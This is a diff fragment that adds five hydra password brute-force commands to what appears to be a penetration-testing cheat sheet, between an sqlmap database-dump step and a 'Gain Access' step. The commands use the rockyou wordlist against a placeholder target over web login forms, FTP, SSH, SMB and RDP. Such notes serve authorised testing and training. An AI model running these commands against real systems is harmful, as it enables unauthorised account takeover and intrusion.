@@ -24,6 +24,16 @@ $sqlmap -u http://Target_IP/login.php --forms --dump
 
 # 4° Crack Password
 
+$hydra -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP http-post-form "/login.php:username=^USER^&password=^PASS^:Login Failed"
+
+$hydra -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP ftp
+
+$hydra -f -l user_name -P /usr/share/wordlists/rockyou.txt Target_IP -t 4 ssh
+
+$hydra -f -l user -P /usr/share/wordlists/rockyou.txt Target_IP -t 4 smb
+
+$hydra -l username -P /usr/share/wordlists/rockyou.txt Target_IP rdp
+
 # 5° Gain Access
 
 http://example.com/login
